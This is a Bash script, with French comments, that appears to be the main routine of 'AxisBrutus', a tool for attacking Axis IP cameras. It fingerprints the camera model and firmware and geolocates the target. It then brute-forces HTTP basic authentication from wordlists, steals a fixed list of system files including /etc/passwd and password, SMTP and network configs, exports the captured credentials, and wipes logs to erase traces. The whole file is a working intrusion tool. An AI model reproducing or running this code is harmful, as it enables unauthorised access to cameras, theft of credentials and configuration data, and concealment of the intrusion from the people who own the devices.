nb_combinaisons=$(($nb_users*$nb_mdp))

####################################################################################################################
#                                                        START
####################################################################################################################
clear

#banniere
echo -en $rouge_fonce
echo -en $banniere|base64 -d


#Version
texte_ver="Version $ab_ver ¤"
espaces=$(ajouterEspacesSlogans "$texte_ver")
echo -e $rouge$espaces$texte_ver

#slogan
#texte_slogan="$ab_slogan$ab_ver"' Version '
#espaces=$(ajouterEspacesSlogans "$texte_slogan")
#echo -e $rouge_fonce' Version '$ab_ver$espaces$ab_slogan


#slogan V2
texte_slogan="$ab_slogan ¤"
espaces=$(ajouterEspacesSlogans "$texte_slogan")
echo -e $rouge_fonce$espaces$texte_slogan

#auteur
texte_auteur="Par $ab_auteur ¤"
espaces=$(ajouterEspacesSlogans "$texte_auteur")
echo -en $jaune_fonce
echo -e $espaces$texte_auteur

#mail
texte_mail="$ab_contact ¤"
espaces=$(ajouterEspacesSlogans "$texte_mail")
echo -en $vert_fonce
echo -e $espaces$texte_mail

#wab
texte_web="$ab_web ¤"
espaces=$(ajouterEspacesSlogans "$texte_web")
echo -en $cyan_fonce
echo -e $espaces$texte_web


#infos multicouleurs
#echo -e "$vert_fonce $ab_auteur$cyan_fonce Ver. $ab_ver$bleu_fonce $ab_contact$magenta_fonce $ab_web$reset\n"

#debug : exit

####################################################################################################################
#                                                     LISTE PARAMETRES
####################################################################################################################


echo -e "$jaune_fonce\n$souligne"'PARAMETRES:'$reset

echo -e "$jaune[+] Cible : $cyan$ip"
echo -e "$jaune[+] Password list:$cyan $mdp_wordlist $jaune"
echo -e "$jaune[+] Usernames list:$cyan $users_wordlist $jaune"
echo -e "$jaune[+] Total usernames:$cyan$nb_users"
echo -e "$jaune[+] Total passwords:$cyan$nb_mdp"
echo -e "$jaune[+] Nombre de combinaisons:$cyan"$nb_combinaisons
echo -e "$jaune[+] TTL Requêtes HTTP: $cyan curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"

####################################################################################################################
#                                                       ANALYSE
####################################################################################################################
echo -e "$jaune_fonce\n$souligne"'ANALYSE:'$reset

#Informations sur la cibles
echo -en "$jaune[+] Modeles testés :$cyan"
echo -e "$cyan"${#liste_modeles_verifies[*]}"$cyan au total. $cyan_fonce(--list pour lister les modeles testés)"


#detection du modele
if [ "$skipModeleDetect" = "OUI" ];then
	echo -e "$jaune[+] Detection du modele non effectuée car l'argument --skip (-s) a été passé! $cyan"
	modele_complet=$modele_nondetecte
else
	echo -en "$jaune[+] Detection du modele de la camera en cours...$cyan"
	#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
	x_modele_complet=$(fullModeleDetect $ip)
	modele=$(echo $x_modele_complet|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
	modele=${modele/.*[aA][xX][iI][sS]/axis}

	#echo -e $magenta$x_modele_complet
	if [ "$modele_complet" != "$modele_nondetecte" ]; then
		for mod in ${liste_modeles_verifies[*]}; do
			if [ "$mod" = "$modele" ];then
				modeles_verifie="OUI"
			fi
		done

		if [ "$modeles_verifie" = "OUI" ];then
			echo -e "$vert$modele, testé et vérifié! $jaune_fonce;)"
		else
			echo -e "$rougeCe modele $modele n'a pas été testé! $jaune_fonce:/"
		fi
	else
		echo -e "$magenta Le modele n'a pas été reconnu! $jaune_fonce:/"
	fi

	echo -e "$jaune[+] Detection de la version du firmware...$cyan"
	#version=$(versionDetect $modele_complet) #pb resultats erronés
	version=$(echo $modele_complet|rev|cut -d " " -f 1|rev)
	if [ "$version" != "N/A" ]; then
		version=$(echo $modele_complet|egrep -o [0-9.,].*)
	fi

fi


echo -e "$jaune[+] Cherche une URL à attaquer...$cyan"
if [ "$urlforced" != "OUI" ]; then 
	url=$(urlModele $ip $modele)
fi

ip4file=${ip/:/-PORT_}
fichier_mdp_trouve=${fichier_mdp_trouve/~MODELE~/$modele}
fichier_mdp_trouve=${fichier_mdp_trouve/~IP~/$ip4file}
if [ "$fichier_mdp_trouve" != "$fichier_mdp_trouve_default" ];then
	echo -e "$jaune[+] Fichier export:$cyan $fichier_mdp_trouve $jaune"
fi

#La geolocalisation
if [ "$skipGeo" != "OUI" ];then
	echo -e "$jaune[+] Geolocalisation de l'IP...$cyan"
	infosGeo_save=$(infosGeolocalisation $ip)
	infosGeo=$infosGeo_save
	infosGeoExport=$infosGeo_save
fi

#prepas vars env et mise en forme 
echo -e "$jaune[+] Préparation de l'environnement...$cyan"

infosGeo=${infosGeo//':'/":$cyan"}
infosGeo=${infosGeo//','/"\n$jaune |_[-]"}


####################################################################################################################
#                                                       INFORMATIONS
####################################################################################################################
echo -e "$jaune_fonce\n$souligne"'INFORMATIONS:'$reset

echo -e "$jaune[+] IP:$cyan $ip"
echo -en "$jaune[+] Modele:$cyan $modele"
if [ ${#version} -gt 0 ]; then 
	echo -en "$cyan (Firmware ver. $magenta$version$cyan)"
else
	echo -en "$cyan "
fi
if [ "$modeles_verifie" = "OUI" ]; then 
	echo -e $cyan" ("$vert"modele reconnu"$cyan")"
else
	echo -e $cyan" ("$rouge"modele non verifié"$cyan")"
fi

echo -e "$jaune[+] URL Cible generée:$cyan $url"

if [ "$skipGeo" != "OUI" ];then
	if [ ${#infosGeo} -eq 0 ]; then infosGeo="Pas d'informations disponibles" ;fi
	echo -e "$jaune[+] Geolocalisation :"
	echo -en "$jaune |_[-] "$infosGeo""
fi
echo -e "$jaune"



####################################################################################################################
#                                                TRAITEMENT/ATTAQUE
####################################################################################################################
echo -e "$jaune_fonce\n$souligne"'TRAITEMENT:'$reset

progression_pourcent=0
while read user; do 
	while read mdp; do 

		#avancement:
		total_fait=$(($total_fait+1))		
		total_fait_txt=$(addZeros $nb_combinaisons $total_fait)
		progression_pourcent=$(($total_fait*100/$nb_combinaisons))
		progression_pourcent_txt=$(addZeros 100 $progression_pourcent)		

		#debug mode: if [ $total_fait -gt 15 ]; then exit; fi

		
		#avancement:
		echo -en "$jaune[$magenta$total_fait_txt$jaune/$magenta_fonce$nb_combinaisons$jaune] [$vert_fonce$progression_pourcent_txt%$jaune] $user $jaune_fonce&$jaune $mdp : "
		
		#Requete HTTP
		curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
		
		#pour debug rapide: if [ $total_fait -gt 5 ];then exit; fi
		
		#analyse de la reponse
		test_unauthorized=$(cat $tmp |grep --binary-files=text -i $echec)
		#echo "@test_unauthorized@=$test_unauthorized"
		test_javascript=$(cat $tmp |egrep --binary-files=text -i 'enable JavaScript')
		#echo "@test_javascript@=$test_javascript"
		test_administration=$(cat $tmp |egrep --binary-files=text -i 'administration tools')
		#echo "@test_administration@=$test_administration"
		test_configuration=$(cat $tmp |egrep --binary-files=text -i 'Basic Configuration')
		#echo "@test_configuration@=$test_configuration"
		test_page404=$(cat $tmp |egrep --binary-files=text -i '<TITLE>404 Not Found')
		#echo "@test_page404@=$test_page404"
		test_presence_lien_admin=$(cat $tmp |egrep --binary-files=text -i '/admin/users.shtml') #utile dans les cas javascript
		#echo "@test_presence_lien_admin@=$test_presence_lien_admin"

		#si le titre contien "unhotorized"
		if [ ${#test_unauthorized} -gt 0 ];then
			echo -e $rouge$msg_echec
		else			
			#sinon on a administration dans le titre de la page alors considere qu'on a passé la porte :D
			if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
				echo -e $vert$msg_succes
				mdp_trouve='OUI'
				break
			else					
				#si pas de titre administration mais la page contient "enable javascript"
				if [ ${#test_javascript} -gt 0 ];then					
					if [ ${#test_presence_lien_admin} -gt 0 ];then
						echo -e $vert$msg_succes
						mdp_trouve='OUI'
						break
					else
						echo -e "$rouge$msg_echec: Necessite Javascript. Verifiez cette combinaison manuellement pour vérifier svp"
						echec_js="OUI"
						#echo -e $bleu;cat $tmp;echo -e $reset
						#break
					fi
				#si pas la page admiistration et pas de message JS
					
				else
					#si page 404
					if [ ${#test_page404} -gt 0 ];then
						echo -e "$rouge$msg_echec: Page introuvable. Forcez l'URL avec l'argument \"--url /admin/users.shtml\" $jaune_fonce:/"
						echec_404="OUI"
						break
					#sinon ok?
					else				
						echo -e $vert$msg_succes
						mdp_trouve="OUI"
						break
					fi
					
				fi

			fi
		fi

	done < $mdp_wordlist

	#on check si on a trouvé un mdp afin de ne pas tester plus de usernames
	if [ "$mdp_trouve" = "OUI" ] ; then
		break
	fi
	#if [ "$echec_js" = "OUI" ]; then
	#	break
	#fi
	if [ "$echec_404" = "OUI" ]; then
		break
	fi
done < $users_wordlist

heure_fin=$(/bin/date +%s)
heure_duree_totale=$(($heure_fin-$heure_depart))
duree_totale=$(/bin/date -d @$heure_duree_totale +%M:%S)
####################################################################################################################
#                                    			BRAVO OU PAS ?
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e $rouge
	echo -e $banniere_bravo|base64 -d
	echo -e $reset
fi
####################################################################################################################
#                                    SYNTHESE DES DONNEES RECUPEREES POUR l'EXPORT
####################################################################################################################
echo -e "$jaune_fonce\n$souligne""SYNTHESE DES DONNEES RECUPEREES POUR l'EXPORT:"$reset

if [ "$mdp_trouve" = "OUI" ]; then
	echo -en "$jaune[+] En cours..."
	
	export_donnes='INFORMATIONS IDENTIFICATION:'
	export_donnes=$export_donnes"\n - LOGIN: $user"
	export_donnes=$export_donnes"\n - MOT-DE-PASSE: $mdp"

	export_donnes=$export_donnes'\n\nINFORMATIONS CAMERA:'
	if [ "$exportforced" = "OUI" ];then
		export_destination="$fichier_mdp_trouve"
	else
		echo $(mkdir "$dossier_mdps" 2>&1) 1>/dev/null
		export_destination="$dossier_mdps/$fichier_mdp_trouve"
	fi

	export_donnes=$export_donnes"\n - IP: $ip"
	export_donnes=$export_donnes"\n - Modele: $modele"

	if [ ${#version} -gt 0 ]; then 
		export_donnes=$export_donnes" (Firmware ver. $version)"
	else
		export_donnes=$export_donnes""
	fi
	if [ "$modeles_verifie" = "OUI" ]; then 
		export_donnes=$export_donnes" (modele reconnu)"
	else
		export_donnes=$export_donnes" (modele non verifié)"
	fi

	export_donnes=$export_donnes"\n - URL Cible generée: $url"
	if [ "$skipGeo" != "OUI" ];then
		if [ ${#infosGeoExport} -eq 0 ]; then infosGeoExport="Pas d'informations disponibles" ;fi
		export_donnes=$export_donnes"\n - Geolocalisation :\n\t- "
		#infosGeo=${infosGeoExport//':'/":"}
		export_donnes=$export_donnes" "${infosGeoExport//','/"\n\t- "}""
	fi

	export_donnes=$export_donnes'\n\nINFORMATIONS ATTAQUE:'
	export_donnes=$export_donnes"\n - Date: "$(/bin/date "+%c")
	export_donnes=$export_donnes"\n - Durée: "$duree_totale
	export_donnes=$export_donnes"\n - Départ de l'attaque: "$(/bin/date -d @$heure_depart )
	export_donnes=$export_donnes"\n - Nombre tentatives: "$total_fait" sur un total de "$nb_combinaisons
	export_donnes=$export_donnes"\n - Fin de l'attaque: "$(/bin/date -d @$heure_fin )
	export_donnes=$export_donnes"\n - Fichier usernames utilisé: "$users_wordlist" ($nb_users usernames)"
	export_donnes=$export_donnes"\n - Fichier mot-de-passe utilisé: "$mdp_wordlist" ($nb_mdp mot-de-passe)"
	if [ "$skipModeleDetect" = 'OUI' ];then
		export_donnes=$export_donnes"\n - La détection du modèle a été ignorée : L'argument \"--skip\" (ou équivalent) a été passé."
	fi
	if [ "$skipGeo" = 'OUI' ];then
		export_donnes=$export_donnes"\n - La géolocalisation a été ignorée : L'argument \"--no-geo\" (ou équivalent) a été passé."
	fi

	echo -e "$cyan terminé!"
fi

####################################################################################################################
#                                             TELECHARGEMENT DE FICHIERS
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne"'TELECHARGEMENT DE FICHIERS:'$reset
	fichiers_a_voler=('/etc/passwd' '/etc/group' '/etc/applications/config_cam1' '/etc/network/network.conf' '/etc/resolv.conf' '/etc/sftpd.banner' '/var/log/messages' '/var/log/messages.old' '/etc/sysconfig/id.conf' '/etc/sysconfig/appwiz.conf' '/etc/sysconfig/systime.conf' '/etc/sysconfig/isp.conf' '/etc/sysconfig/brand.conf' '/etc/sysconfig/smtp.conf' '/etc/sysconfig/image.conf' '/etc/sysconfig/dst.conf' '/etc/sysconfig/layout.conf' '/etc/httpd/conf/boa.conf' '/etc/pwdb.conf' )

	temp_vole='/tmp/export_vole.txt'

	export_donnes=$export_donnes'\n\nFICHIERS:'
	for fichier_x in ${fichiers_a_voler[*]}; do

		voleFichier $ip $fichier_x > $temp_vole
		
		#affichage a l'ecran
		echo -e "$jaune[+] FICHIER:$cyan $fichier_x:"
		echo -e "$vert--------------------------------------------------------------$italic$vert_fonce"
		cat $temp_vole
		echo -e "$vert--------------------------------------------------------------$reset"
		
		#export
		export_donnes=$export_donnes"\n$fichier_x:"
		export_donnes=$export_donnes"\n--------------------------------------------------------------"
		while read ligne_fic; do
			export_donnes=$export_donnes"\n"$ligne_fic""
		done < $temp_vole
		export_donnes=$export_donnes"\n--------------------------------------------------------------\n\n"

	done;


	echo -e "$reset"
fi

####################################################################################################################
#                                            EXPORT DES DONNES
####################################################################################################################
if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne"'SAUVEGARDE/EXPORT:'$reset
	echo -en "$jaune[+] En cours..."

	echo -e $banniere_export|base64 -d > $export_destination
	echo -e " $ab_web\t \t AxisBrutus Ver. $ab_ver" >> $export_destination
	echo -e "-------------------------------------------------------------------------------" >> $export_destination
	echo -e "\n$export_donnes" >> $export_destination
	echo -e "-------------------------------------------------------------------------------" >> $export_destination
	echo -e " $ab_auteur  -  $ab_contact  -  $ab_web" >> $export_destination
	echo -e "$cyan terminé!"
fi
####################################################################################################################
#                                                      RESUME
####################################################################################################################
echo -e "$jaune_fonce\n$souligne"'RESUME:'$reset
if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune[+] BRAVO:$cyan On l'a trouvé en $vert$total_fait$cyan essais!"
	echo -e "$jaune[+] EXPORT:$cyan Les informations d'identification ont été stockées ici : $vert$fichier_mdp_trouve"
else
	if [ "$echec_js" = "OUI" ]; then		
		echo -e "$jaune[+] M****:$cyan Cette interface web axis nécessite javascript. $jaune_fonce:'("
		echo -e "$jaune[+] INFO:$cyan Version javascript en cours de dev $jaune_fonce;)"
	else
		echo -e "$jaune[+] M****:$cyan $total_fait essais sans trouver $jaune_fonce:'("
		echo -e "$jaune[+] ASTUCE:$cyan Ajoute des logins et des mdp aux fichiers wordlist $jaune_fonce;)"
	fi
fi
echo -e "$jaune[+] DUREE:$cyan $duree_totale"


####################################################################################################################
#                                              EFFACER LES TRACES/LOGS
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne"'EFFACER LES TRACES/LOGS:'$reset
	echo -en "$jaune[+] En cours..."
	#effacer les traces 
	effacerTraces $ip 

	echo -e "$cyan terminé!"
fi
####################################################################################################################
#                                                        END
####################################################################################################################


echo -e $reset
exit
